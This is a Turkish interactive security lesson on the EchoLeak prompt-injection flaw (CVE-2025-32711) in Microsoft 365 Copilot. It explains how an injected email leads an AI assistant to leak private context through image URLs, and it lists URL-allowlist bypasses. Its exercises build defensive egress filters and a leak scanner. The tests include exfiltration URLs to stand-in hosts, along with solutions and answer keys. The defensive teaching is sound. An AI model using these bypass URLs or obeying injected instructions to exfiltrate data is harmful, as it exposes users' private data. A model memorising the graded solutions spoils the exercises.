---
id: ai-olay-01
title: "EchoLeak · Retrieval ile Egress Arasındaki Sınır"
summary: CVE-2025-32711 bağlamında özel bağlam verisinin dış URL üzerinden sızmasını kanonik egress politikası, canlı açık/yamalı senaryo koşusu ve Markdown DLP taramasıyla incele.
esleme: ai-saldiri-21, ai-saldiri-23, ai-savunma-14, ai-guvence-05
timeout: 30
---

::: anlat 1. Gerçek olay ve yerel kopya sınırı
Haziran 2025'te kamuya açıklanan **CVE-2025-32711** (*EchoLeak* olarak da anılır), Microsoft'un resmi CNA kaydında **Microsoft 365 Copilot** üzerinde kimliği doğrulanmamış bir saldırganın ağ üzerinden bilgi ifşasına (*information disclosure*) yol açabildiği **uygunsuz girdi doğrulama / dolaylı komut enjeksiyonu** zafiyeti olarak tanımlanır. Dışarıdan gelen güvenilmeyen bir belgenin (örneğin e-postanın) `retrieval` ile bağlama girmesi ve aynı oturumdaki özel kurumsal verilerin istemci tarafından otomatik yüklenen bir bağlantı/görüntü URL'sine gömülerek dışarı taşınması, kurumsal asistanlarda `retrieval` ile `egress` arasındaki sınırın neden kritik olduğunu gösterir.

> [!NOTE]
> **Yerel kopya ayrımı:** Bu dersteki kod Microsoft 365 Copilot'un iç protokolünü, CSP kurallarını veya SharePoint vekilini yeniden üretmez. Yalnız "özel bağlam okuyan bir asistan hangi URL'ye istek tetikleyebilir?" güven sınırını çevrimdışı, sentetik ve deterministik bir Python modelinde sınar. Hiçbir ağ bağlantısı açılmaz.
:::

::: anlat 2. Mekanizma · URL ayrıştırıcı farkları ve iki katmanlı savunma
Bir asistan hem kullanıcının özel belgelerini okuma yetkisine (`high confidentiality`) hem de dış kaynaklara görsel/önizleme isteği tetikleme yetkisine (`external egress`) sahipse **ölümcül üçlü (`lethal trifecta`)** oluşur: güvenilmeyen girdi + özel veri erişimi + dış iletişim kanalı.

Geliştiriciler bu kanalı kapatmak için çoğu zaman "yalnız kurumun sabit varlık alan adına (`https://arsiv.invalid/logo`) izin verelim" der, fakat URL doğrulamasını ham dizge ön ekiyle (`url.startswith('https://arsiv.invalid')`) yazar. RFC 3986 ayrıştırmasında bu kontrol dört farklı yoldan delinir:

1. **Alt alan adı aldatmacası:** `https://arsiv.invalid.collector.invalid/logo` ön eki sağlar ama başka sunucuya gider.
2. **Kullanıcı bilgisi (`userinfo`):** `https://arsiv.invalid@collector.invalid/logo` adresinde gerçek `hostname` `@` işaretinden sonraki `collector.invalid` sunucusudur.
3. **Sorgu ve `fragment` taşıyıcısı:** İzinli sunucunun erişim günlükleri paylaşılıyorsa veya açık yönlendirme varsa `?data=SIR` ve `#SIR` alanları veri taşır.
4. **Standart dışı port ve yol:** `:8443` aynı makinede farklı bir servise, `/pixel` ise farklı bir uç noktaya gider.

**Yaygın yanlışlar**

| Yanlış yaklaşım | Neden kırılır? | Doğru sınır |
|---|---|---|
| `url.startswith('https://arsiv.invalid')` | `@collector.invalid` ve `.evil.invalid` URL'lerini geçirir | `urlsplit` sonrası `p.hostname == 'arsiv.invalid'` ve `username/password is None` |
| `url == 'https://arsiv.invalid/logo'` sabit dizge eşlemesi | RFC uyumlu açık varsayılan portu (`https://arsiv.invalid:443/logo`) meşru olduğu halde reddeder | `p.port in (None, 443)` ve `p.path == '/logo'` kontrolü |
| Yamayı hazır `True/False` tablosundan özetlemek | Açık ve yamalı işlev gerçekten çağrılmadığı için yamadaki regresyon gizlenir | Senaryo girdilerini hem açık hem yamalı sınırda bizzat çalıştırıp ölçmek |
:::

::: tahmin Ön ek kontrolü ile `urlsplit().hostname` arasındaki uçurum
Aşağıdaki iki URL'nin hangisi `startswith` kontrolünden geçer, hangisi gerçekten `arsiv.invalid` sunucusuna gider?

```python
from urllib.parse import urlsplit

adaylar = [
    'https://arsiv.invalid.evil.invalid/logo',
    'https://arsiv.invalid@collector.invalid/logo',
]
for u in adaylar:
    p = urlsplit(u)
    print(u.startswith('https://arsiv.invalid'), p.hostname, p.username)
```

???

```cikti
True arsiv.invalid.evil.invalid None
True collector.invalid arsiv.invalid
```
İki URL de `'https://arsiv.invalid'` ile başlar! Birincisinde `arsiv.invalid` yalnız saldırgan alan adının alt etiketi, ikincisinde ise `@` öncesi kullanıcı adıdır (`p.username`). Kanonik ayrıştırma olmadan dizge ön ekiyle `egress` sınırı kurulamaz.
:::

::: gorev 1 · Kanonik URL çıkış (`egress`) kapısını kur
`egress_karari(url)` işlevini yaz. Yalnız aşağıdaki koşulların **tamamını** sağlayan URL'ler için `True`, diğer tüm `str` ve `str` dışı girdiler için `False` döndür (hiçbir ağ bağlantısı açma):

- Şema tam `'https'` olmalı;
- Kanonik `hostname` tam `'arsiv.invalid'` olmalı;
- Kullanıcı adı (`username`) ve parola (`password`) bulunmamalı (`None`);
- Port belirtilmemiş (`None`) veya `443` olmalı;
- Yol (`path`) tam `'/logo'` olmalı;
- Sorgu (`query`) ve parça (`fragment`) boş olmalı;
- Başta/sonda boşluk veya kontrol karakteri taşıyan dizgeler reddedilmeli (`url == url.strip()` ve boşluksuz).

Sentetik `ornek.json` çalışma dizinine hazırlanır. KUSURLU başlangıç `startswith('https://arsiv.invalid')` kullandığı için hem sorgu parametreli sızıntıları hem `@collector.invalid` yönlendirmelerini geçiriyor.

```setup
import sys
from pathlib import Path
sys.path.insert(0, str(Path(sys.modules['__main__'].__file__).resolve().parents[1]))
Path('ornek.json').write_text('[\n  "https://arsiv.invalid/logo"\n]', encoding='utf-8')
```

```starter
def egress_karari(url):
    return isinstance(url, str) and url.startswith('https://arsiv.invalid')

if __name__ == '__main__':
    import json
    from pathlib import Path
    _args = json.loads(Path('ornek.json').read_text(encoding='utf-8'))
    print(egress_karari(*_args))
```

```solution
from urllib.parse import urlsplit

def egress_karari(url):
    if not isinstance(url, str) or not url or url != url.strip() or any(c.isspace() for c in url):
        return False
    try:
        p = urlsplit(url)
        port = p.port
    except ValueError:
        return False
    return (
        p.scheme == 'https'
        and p.hostname == 'arsiv.invalid'
        and p.username is None
        and p.password is None
        and port in (None, 443)
        and p.path == '/logo'
        and not p.query
        and not p.fragment
    )

if __name__ == '__main__':
    import json
    from pathlib import Path
    _args = json.loads(Path('ornek.json').read_text(encoding='utf-8'))
    print(egress_karari(*_args))
```

```test
need('egress_karari')
import copy

_iyi = [
    'https://arsiv.invalid/logo',
    'https://arsiv.invalid:443/logo',
    'HTTPS://ARSIV.INVALID/logo',
]
for _u in _iyi:
    _kopya = copy.deepcopy(_u)
    eq(egress_karari(_kopya), True, f'meşru varlık URL kabul edilmeli: {_u}')

_kotu = [
    'https://arsiv.invalid/logo?data=CANARY',
    'https://arsiv.invalid/logo#CANARY',
    'https://arsiv.invalid.evil.invalid/logo',
    'https://arsiv.invalid@collector.invalid/logo',
    'https://user:pass@arsiv.invalid/logo',
    'https://:gizli@arsiv.invalid/logo',
    'https://arsiv.invalid:8443/logo',
    'https://arsiv.invalid:80/logo',
    'https://arsiv.invalid:abc/logo',
    'https://arsiv.invalid/pixel',
    'https://arsiv.invalid/logo/ek',
    'https://arsiv.invalid/',
    'http://arsiv.invalid/logo',
    ' https://arsiv.invalid/logo',
    'https://arsiv.invalid/logo\n',
    'https://[::1/logo',
    '',
    None,
    123,
    ['https://arsiv.invalid/logo'],
]
for _u in _kotu:
    eq(egress_karari(_u), False, f'güvensiz veya bozuk URL reddedilmeli: {_u!r}')

for _i in range(15):
    eq(egress_karari(f'https://arsiv.invalid/logo?c={_i}'), False, 'sorgu sızıntısı engellenir')

# urlsplit, WHATWG uyumu için URL içindeki sekme ve satır sonlarını sessizce siler:
# boşluk kontrolü olmadan 'lo\tgo' yolu '/logo' olarak görünür.
eq(egress_karari('https://arsiv.invalid/lo\tgo'), False, 'URL ortasındaki sekme reddedilmeli (urlsplit onu siler)')
eq(egress_karari('https://arsiv.invalid/lo\ngo'), False, 'URL ortasındaki satır sonu reddedilmeli')
eq(egress_karari('https://kullanici@arsiv.invalid/logo'), False, 'yalnız kullanıcı adı taşıyan URL reddedilmeli')
```

```hint
`urllib.parse.urlsplit(url)` çıktısında `p.port` erişimi bozuk portlarda `ValueError` fırlatabilir; `try ... except ValueError` içinde yakalayıp `False` döndür. `p.scheme`, `p.hostname`, `p.username`, `p.password`, `port in (None, 443)`, `p.path == '/logo'`, `not p.query`, `not p.fragment` koşullarının tümünü denetle.
```
:::

::: gorev 2 · Açık ve yamalı sınırı gerçek senaryo vakalarında çalıştırıp ölç
`egress_senaryo_olc(vakalar, acik_fn, yamali_fn)` işlevini yaz. Hazır `once`/`sonra` boolean tabloları **yoktur**; her vaka gerçek URL girdisini taşır ve ölçüm her iki işlevi bizzat çalıştırır (`sandbox.ai_olay_senaryo`):

- `vakalar`: boş olmayan `list`; her öğe `{'saldiri': bool, 'girdi': tuple|list, ...}` yapısında sözlüktür. `acik_fn` ve `yamali_fn` çağrılabilir (`callable`) olmalıdır; aksi tüm durumlarda `ValueError` fırlat.
- Her vaka için `bool(acik_fn(*copy.deepcopy(girdi)))` ve `bool(yamali_fn(*copy.deepcopy(girdi)))` kararlarını hesapla (`True` = dış istek izni verildi).
- Saldırı vakalarında (`saldiri is True`) `True` sonucu **sızıntı**, meşru vakalarda (`saldiri is False`) `True` sonucu **hizmet kabulü** demektir.
- **Regresyon sayısı (`regresyon_n`):** Meşru vakalar içinde `acik_fn` `True` verdiği halde `yamali_fn` `False` vererek bozduğu vaka sayısı (`int`).
- Dönüş sözlüğü: `{'saldiri_n': int, 'mesru_n': int, 'once_sizma': float|None, 'sonra_sizma': float|None, 'mesru_kabul': float|None, 'regresyon_n': int}`. Oranlar kendi grubunun paydasıyla `4` ondalığa yuvarlanır; ilgili grupta hiç vaka yoksa oran `0.0` değil `None` olur.

KUSURLU başlangıç sızıntı oranını yalnız saldırı vakalarına değil tüm listeye bölerek olduğundan küçük gösteriyor ve boş grupta `0.0` döndürüyor.

```setup
import sys
from pathlib import Path
sys.path.insert(0, str(Path(sys.modules['__main__'].__file__).resolve().parents[1]))
```

```starter
def egress_senaryo_olc(vakalar, acik_fn, yamali_fn):
    toplam = len(vakalar)
    once = sum(1 for v in vakalar if v['saldiri'] and acik_fn(*v['girdi']))
    sonra = sum(1 for v in vakalar if v['saldiri'] and yamali_fn(*v['girdi']))
    mesru = sum(1 for v in vakalar if not v['saldiri'] and yamali_fn(*v['girdi']))
    return {
        'saldiri_n': sum(1 for v in vakalar if v['saldiri']),
        'mesru_n': sum(1 for v in vakalar if not v['saldiri']),
        'once_sizma': round(once / toplam, 4),
        'sonra_sizma': round(sonra / toplam, 4),
        'mesru_kabul': round(mesru / toplam, 4),
        'regresyon_n': 0,
    }
```

```solution
import copy

def egress_senaryo_olc(vakalar, acik_fn, yamali_fn):
    if not isinstance(vakalar, list) or not vakalar or not callable(acik_fn) or not callable(yamali_fn):
        raise ValueError('gecerli vakalar ve cagrilaiblir sinirlar gerekli')
    saldiri_once = saldiri_sonra = saldiri_n = 0
    mesru_sonra = regresyon_n = mesru_n = 0
    for v in vakalar:
        if not isinstance(v, dict) or type(v.get('saldiri')) is not bool or not isinstance(v.get('girdi'), (tuple, list)):
            raise ValueError('her vaka saldiri bool ve girdi tuple/list tasimali')
        once_izin = bool(acik_fn(*copy.deepcopy(v['girdi'])))
        sonra_izin = bool(yamali_fn(*copy.deepcopy(v['girdi'])))
        if v['saldiri']:
            saldiri_n += 1
            saldiri_once += int(once_izin)
            saldiri_sonra += int(sonra_izin)
        else:
            mesru_n += 1
            mesru_sonra += int(sonra_izin)
            if once_izin and not sonra_izin:
                regresyon_n += 1
    return {
        'saldiri_n': saldiri_n,
        'mesru_n': mesru_n,
        'once_sizma': round(saldiri_once / saldiri_n, 4) if saldiri_n else None,
        'sonra_sizma': round(saldiri_sonra / saldiri_n, 4) if saldiri_n else None,
        'mesru_kabul': round(mesru_sonra / mesru_n, 4) if mesru_n else None,
        'regresyon_n': regresyon_n,
    }
```

```test
need('egress_senaryo_olc')
import copy
from urllib.parse import urlsplit
from sandbox.ai_olay_senaryo import acik_sinir, senaryo_vakalari

def _referans_yama(url):
    if not isinstance(url, str) or not url or any(c.isspace() for c in url):
        return False
    try:
        p = urlsplit(url)
        port = p.port
    except ValueError:
        return False
    return (p.scheme == 'https' and p.hostname == 'arsiv.invalid' and p.username is None
            and p.password is None and port in (None, 443) and p.path == '/logo'
            and not p.query and not p.fragment)

_vakalar = senaryo_vakalari(1, tohum=7)
_yedek = copy.deepcopy(_vakalar)
_rapor = egress_senaryo_olc(_vakalar, acik_sinir(1), _referans_yama)
eq(_vakalar, _yedek, 'senaryo vakaları yerinde değiştirilmemeli')
eq(_rapor, {
    'saldiri_n': 6,
    'mesru_n': 2,
    'once_sizma': 1.0,
    'sonra_sizma': 0.0,
    'mesru_kabul': 1.0,
    'regresyon_n': 0,
}, 'açık sınır sızdırır, doğru yama sızıntıyı sıfırlar ve meşru trafiği korur')

_asiri_engel = egress_senaryo_olc(_vakalar, acik_sinir(1), lambda _u: False)
eq(_asiri_engel['sonra_sizma'], 0.0, 'her şeyi kapatan yama sızıntıyı sıfırlar')
eq(_asiri_engel['mesru_kabul'], 0.0, 'ama meşru kabul sıfıra düşer')
eq(_asiri_engel['regresyon_n'], 2, 'iki meşru vaka regresyona uğrar')

_dar_yama = egress_senaryo_olc(_vakalar, acik_sinir(1), lambda u: u == 'https://arsiv.invalid/logo')
eq(_dar_yama['mesru_kabul'], 0.5, ':443 meşru vakası bozulduğunda kabul 0.5 olur')
eq(_dar_yama['regresyon_n'], 1, 'tek regresyon sayılmalı')

_yalniz_saldiri = [v for v in _vakalar if v['saldiri']][:3]
_kismi = egress_senaryo_olc(_yalniz_saldiri, acik_sinir(1), lambda u: '?' not in u)
eq(_kismi['sonra_sizma'], 0.6667, '3 saldırıdan 2 tanesi geçerse oran 0.6667 olmalı')
eq(_kismi['mesru_kabul'], None, 'meşru vaka yoksa mesru_kabul None olmalı')

_yalniz_mesru = [v for v in _vakalar if not v['saldiri']]
eq(egress_senaryo_olc(_yalniz_mesru, acik_sinir(1), _referans_yama)['once_sizma'], None, 'saldırı yoksa once_sizma None olmalı')

for _bozuk in ([], None, [{'saldiri': 1, 'girdi': ('x',)}], [{'saldiri': True, 'girdi': 'x'}]):
    raises(ValueError, egress_senaryo_olc, _bozuk, acik_sinir(1), _referans_yama, msg='bozuk vaka ValueError üretmeli')
raises(ValueError, egress_senaryo_olc, _vakalar, 'degil', _referans_yama, msg='çağrılamayan sınır reddedilmeli')

# Ölçüm mantığı alandan bağımsızdır: etiketli soyut vakalarla oranlar kesirli çıkar (2/3, 1/3),
# yama bir saldırıyı hâlâ geçirir ve açık sınırın kabul ettiği bir meşru vakayı reddeder (regresyon).
_el = [
    {'saldiri': True, 'girdi': ('s-ikisi-gecer',)},
    {'saldiri': True, 'girdi': ('s-acik-de-durdurur',)},
    {'saldiri': True, 'girdi': ('s-yalniz-acik-gecer',)},
    {'saldiri': False, 'girdi': ('m-ikisi-gecer',)},
    {'saldiri': False, 'girdi': ('m-ikisi-durdurur',)},
    {'saldiri': False, 'girdi': ('m-regresyon',)},
]
_acik_el = lambda *a: a[0] in ('s-ikisi-gecer', 's-yalniz-acik-gecer', 'm-ikisi-gecer', 'm-regresyon')
_yama_el = lambda *a: a[0] in ('s-ikisi-gecer', 'm-ikisi-gecer')
eq(egress_senaryo_olc(_el, _acik_el, _yama_el), {
    'saldiri_n': 3,
    'mesru_n': 3,
    'once_sizma': 0.6667,
    'sonra_sizma': 0.3333,
    'mesru_kabul': 0.3333,
    'regresyon_n': 1,
}, 'oranlar grup paydasıyla ve 4 basamakla; sıfırdan farklı sonra_sizma ve regresyon doğru sayılmalı')
eq(egress_senaryo_olc(_el, _acik_el, _acik_el)['sonra_sizma'], 0.6667, 'yama açık sınırla aynıysa sonra_sizma = once_sizma')
eq(egress_senaryo_olc(_el, lambda *_a: False, lambda *_a: False)['regresyon_n'], 0,
   'açık sınırın da reddettiği meşru vaka regresyon sayılmaz')
eq(egress_senaryo_olc([v for v in _el if not v['saldiri']], _acik_el, _yama_el),
   {'saldiri_n': 0, 'mesru_n': 3, 'once_sizma': None, 'sonra_sizma': None, 'mesru_kabul': 0.3333, 'regresyon_n': 1},
   'saldırı vakası yoksa once_sizma ve sonra_sizma None')
raises(ValueError, egress_senaryo_olc, tuple(_el), _acik_el, _yama_el, msg='liste olmayan vakalar ValueError')
raises(ValueError, egress_senaryo_olc, _el, None, _yama_el, msg='çağrılamaz açık sınır ValueError')
raises(ValueError, egress_senaryo_olc, _el, _acik_el, 'yama', msg='çağrılamaz yamalı sınır ValueError')
for _bozuk in (
    _el + [('s-ikisi-gecer',)],
    _el + [{'saldiri': 1, 'girdi': ('s-ikisi-gecer',)}],
    _el + [{'saldiri': True, 'girdi': None}],
):
    raises(ValueError, egress_senaryo_olc, _bozuk, _acik_el, _yama_el, msg=f'bozuk vaka şeması ValueError: {_bozuk[-1]!r}')
```

```hint
Saldırı ve meşru sayaçları ayrı tut; `saldiri_n == 0` iken `once_sizma` ve `sonra_sizma` için `None`, `mesru_n == 0` iken `mesru_kabul` için `None` döndür. Regresyon yalnız `not v['saldiri']` ve `once_izin and not sonra_izin` olduğunda artar.
```
:::

::: gorev 3 · Yanıt Markdown bağlantılarında bağlam sızıntısı (`taint`) taraması
Alan adı süzgecinin yanına ikinci savunma katmanı olarak çıktı DLP tarayıcısı `baglam_sizinti_tara(markdown_metin, gizli_parcalar)` işlevini yaz:

- `markdown_metin`: `str`; `gizli_parcalar`: boş olmayan `str` öğelerden oluşan `list` (en az `4` karakterlik hassas dizgeler; `str` olmayan veya `< 4` karakterlik öğe varsa `ValueError` fırlat; boş `gizli_parcalar` listesi geçerlidir ve sızıntı üretmez).
- Metindeki hem görüntü `![alt](url)` hem normal bağlantı `[metin](url)` kalıplarındaki URL'leri sırayla çıkar.
- Her URL'nin hem ham halinde hem `urllib.parse.unquote` ile çözülmüş halinde (küçük/büyük harf duyarsız, `casefold`) `gizli_parcalar` içindeki herhangi bir değerin geçip geçmediğini kontrol et.
- Dönüş: `{'url_sayisi': int, 'sizinti_urller': list[str], 'temiz': bool}` (`sizinti_urller` metindeki görünüm sırasını korur, aynı URL birden çok gizli parça içerse bile bir kez eklenir; `temiz` yalnız `sizinti_urller` boşsa `True` olur).

KUSURLU başlangıç `unquote` çözümü yapmadığı ve harf büyüklüğünü normalize etmediği için `%` kodlu sızıntıları kaçırıyor.

```setup
import sys
from pathlib import Path
sys.path.insert(0, str(Path(sys.modules['__main__'].__file__).resolve().parents[1]))
```

```starter
import re

def baglam_sizinti_tara(markdown_metin, gizli_parcalar):
    urller = re.findall(r'\[[^\]]*\]\(([^)\s]+)\)', markdown_metin)
    sizinti = [u for u in urller if any(g in u for g in gizli_parcalar)]
    return {'url_sayisi': len(urller), 'sizinti_urller': sizinti, 'temiz': len(sizinti) == 0}
```

```solution
import re
from urllib.parse import unquote

def baglam_sizinti_tara(markdown_metin, gizli_parcalar):
    if not isinstance(markdown_metin, str) or not isinstance(gizli_parcalar, list):
        raise ValueError('markdown_metin str ve gizli_parcalar list olmali')
    aranan = []
    for parca in gizli_parcalar:
        if not isinstance(parca, str) or len(parca.strip()) < 4:
            raise ValueError('her gizli parca en az 4 karakterlik str olmali')
        aranan.append(parca.strip().casefold())
    urller = re.findall(r'!?\[[^\]]*\]\(([^)\s]+)\)', markdown_metin)
    sizinti = []
    for ham_url in urller:
        cozulmus = unquote(ham_url).casefold()
        ham_kucuk = ham_url.casefold()
        if any(g in ham_kucuk or g in cozulmus for g in aranan):
            sizinti.append(ham_url)
    return {
        'url_sayisi': len(urller),
        'sizinti_urller': sizinti,
        'temiz': len(sizinti) == 0,
    }
```

```test
need('baglam_sizinti_tara')
_md = (
    'Özet: ![logo](https://arsiv.invalid/logo) ve '
    '![iz](https://collector.invalid/p?q=PRJ%2D9941) ayrıca '
    '[rapor](https://arsiv.invalid/indir?ref=kasa_anahtar)'
)
_sonuc = baglam_sizinti_tara(_md, ['prj-9941', 'KASA_ANAHTAR'])
eq(_sonuc, {
    'url_sayisi': 3,
    'sizinti_urller': [
        'https://collector.invalid/p?q=PRJ%2D9941',
        'https://arsiv.invalid/indir?ref=kasa_anahtar',
    ],
    'temiz': False,
}, 'hem %2D kodlu hem harf farkı olan sızıntılar yakalanmalı')

_temiz = baglam_sizinti_tara('Bakınız: ![logo](https://arsiv.invalid/logo)', ['GIZLI99'])
eq(_temiz, {'url_sayisi': 1, 'sizinti_urller': [], 'temiz': True}, 'temiz Markdown onaylanmalı')
eq(baglam_sizinti_tara('Bağlantısız düz metin GIZLI99', ['GIZLI99']), {'url_sayisi': 0, 'sizinti_urller': [], 'temiz': True}, 'yalnız URL kanalları taranır')
eq(baglam_sizinti_tara('![a](https://x.invalid/?v=ABCD1234)', ['ABCD', '1234']), {
    'url_sayisi': 1,
    'sizinti_urller': ['https://x.invalid/?v=ABCD1234'],
    'temiz': False,
}, 'aynı URL iki parça eşleşse bile tek kez listelenmeli')

for _hatali in ((None, ['ABCD']), ('metin', 'ABCD'), ('metin', ['ab']), ('metin', ['   ']), ('metin', [1234]),
                ('metin', ('ABCD',)), ('metin', ['abc']), ('metin', [' abc '])):
    raises(ValueError, baglam_sizinti_tara, *_hatali, msg=f'geçersiz argümanlar reddedilmeli: {_hatali!r}')
eq(baglam_sizinti_tara('![a](https://x.invalid/?v=abcd)', ['abcd'])['temiz'], False, 'tam 4 karakterlik parça kabul edilir')

# Sırrın kendisi % dizisi içerebilir: ham URL'de birebir geçer, çözülmüş hâlde değişir.
eq(baglam_sizinti_tara('![a](https://x.invalid/?k=p%41ss99)', ['p%41ss99']), {
    'url_sayisi': 1,
    'sizinti_urller': ['https://x.invalid/?k=p%41ss99'],
    'temiz': False,
}, 'ham URL de taranmalı: çözümleme % içeren sırrı gizler')
```

```hint
`re.findall(r'!?\[[^\]]*\]\(([^)\s]+)\)', markdown_metin)` ile URL listesini çıkar; her URL için `unquote(u).casefold()` üzerinde aranan parçaları kontrol et.
```
:::

::: anlat Bunu iki dakikada nasıl anlatırsın?
1. **Olay bağlamı (15 sn).** "CVE-2025-32711, kurumsal bir asistanda dış belgeden gelen yönlendirmenin özel bağlam verisini dış URL isteğine dönüştürebildiğini gösteren bir bilgi ifşası kaydıdır."
2. **Mekanizma (30 sn).** "Okuma yetkisi ile dışarı istek tetikleme (`egress`) aynı akışta birleştiğinde Markdown görüntüsü sıfır tıklamalı veri çıkış kanalına dönüşür."
3. **Yanlış yama (30 sn).** "`startswith('https://arsiv.invalid')` kontrolü `@collector.invalid` ve `.evil.invalid` URL'lerinde kırılır; sabit dizge eşlemesi ise meşru `:443` portunu bozar."
4. **Ölçüm kanıtı (25 sn).** "Açık ve yamalı sınırı 8 senaryo vakasında bizzat çalıştırdım: saldırı sızıntısı `1.0` değerinden `0.0` değerine inerken meşru kabul `1.0` ve regresyon `0` kaldı."
5. **Sınır cümlesi (20 sn).** "Bu yerel model Copilot'un iç mimarisini değil, kanonik URL ayrıştırma ve çıktı `taint` taramasının çalışma ilkesini kanıtlar."
:::

::: anlat Sınır ve kaynak
Bu dersteki model RFC 3986 dizge ayrıştırması ve URL kodlu alt dizge taramasıyla sınırlıdır. Gerçek sistemlerde saldırgan gizli veriyi `base64` veya sözcük özetleriyle kodlayarak Görev 3'teki DLP alt dizge taramasını aşabilir; bu nedenle asıl birincil kontrol Görev 1'deki sıkı `egress allowlist` ve tarayıcı `CSP` (`img-src`, `connect-src`) katmanıdır. Ayrıca sunucu-taraflı isteklerde DNS yeniden bağlama (`DNS rebinding`) riskine karşı çözümlenen IP adresinin de doğrulanması gerekir (`ai-savunma-14`).

- Birincil kaynaklar: [Microsoft CNA CVE-2025-32711 JSON kaydı](https://raw.githubusercontent.com/CVEProject/cvelistV5/main/cves/2025/32xxx/CVE-2025-32711.json), [MSRC CVE-2025-32711 kılavuz sayfası](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-32711). Doğrulama tarihi: 10 Kasım 2026.
:::

::: dusun
Kurum içi bir vekil sunucu (`https://proxy.sirket.invalid/getir?hedef=...`) üzerinden dış görselleri yükleyen bir mimaride Görev 1'deki `hostname == 'proxy.sirket.invalid'` kontrolü neden tek başına `exfiltration` kanalını kapatmaz?
:::

::: ozet
- Bağlamdaki özel veriyi okuma izni, o veriyi dış URL parametrelerine gömme izni değildir.
- `egress` politikası ham dizge ön ekinde değil, `urlsplit` ile ayrıştırılmış kanonik bileşenler (`scheme`, `hostname`, `userinfo`, `port`, `path`, `query`, `fragment`) üzerinde uygulanır.
- Yama başarısı önceden yazılmış `True/False` tablolarıyla değil, açık ve yamalı sınır işlevlerinin gerçek vakalar üzerinde çalıştırılması ve regresyon sayılmasıyla ölçülür.
:::
